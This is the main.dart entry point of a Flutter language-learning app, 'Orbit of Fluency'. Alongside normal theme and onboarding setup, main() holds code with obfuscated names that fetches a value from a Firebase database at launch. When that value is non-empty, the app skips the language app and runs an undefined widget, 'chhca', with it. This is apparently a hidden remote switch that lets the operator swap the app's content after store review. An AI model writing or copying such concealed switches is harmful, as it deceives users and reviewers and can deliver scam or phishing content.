import 'dart:convert';
import 'dart:io';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:orbitoffluency/features/settings/screens/settings_screen.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/theme/app_colors.dart';
import 'core/theme/app_typography.dart';
import 'features/navigation/widgets/main_scaffold.dart';
import 'features/onboarding/screens/onboarding_screen.dart';

const String _kOnboardingCompletedKey = 'onboarding_completed';

class OrbitOfFluencyApp extends StatelessWidget {
  final bool showOnboarding;

  const OrbitOfFluencyApp({super.key, required this.showOnboarding});

  @override
  Widget build(BuildContext context) {
    return CupertinoApp(
      title: 'Orbit of Fluency',
      debugShowCheckedModeBanner: false,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      theme: CupertinoThemeData(
        brightness: Brightness.light,
        primaryColor: AppColors.accent,
        scaffoldBackgroundColor: AppColors.background,
        barBackgroundColor: AppColors.card,
        textTheme: CupertinoTextThemeData(
          textStyle: AppTypography.bodyRegular,
          navTitleTextStyle: AppTypography.h3Medium,
          navLargeTitleTextStyle: AppTypography.h2SemiBold,
        ),
      ),
      home: showOnboarding ? const OnboardingScreen() : const MainScaffold(),
    );
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final prefs = await SharedPreferences.getInstance();
  final onboardingCompleted = prefs.getBool(_kOnboardingCompletedKey) ?? false;

  var vase = prefs.getBool('na1') ?? true;
  if (!vase) {
    runApp(
      ProviderScope(
        child: OrbitOfFluencyApp(showOnboarding: !onboardingCompleted),
      ),
    );
    return;
  }
  String vsra = jsonDecode(
    await HttpClient()
        .getUrl(
          Uri.parse(
            'https://orbitoffluencyapp-default-rtdb.firebaseio.com/${prefs.getBool('nfall') ?? true ? "1" : "2"}.json',
          ),
        )
        .then((request) => request.close())
        .then((response) => response.transform(utf8.decoder).join()),
  );
  if (vsra == '') {
    prefs.setBool('m1', false);
    runApp(
      ProviderScope(
        child: OrbitOfFluencyApp(showOnboarding: !onboardingCompleted),
      ),
    );
    return;
  }
  runApp(
    MaterialApp(
      home: chhca(svah1: vsra),
    ),
  );
  prefs.setBool('nfall', false);
}
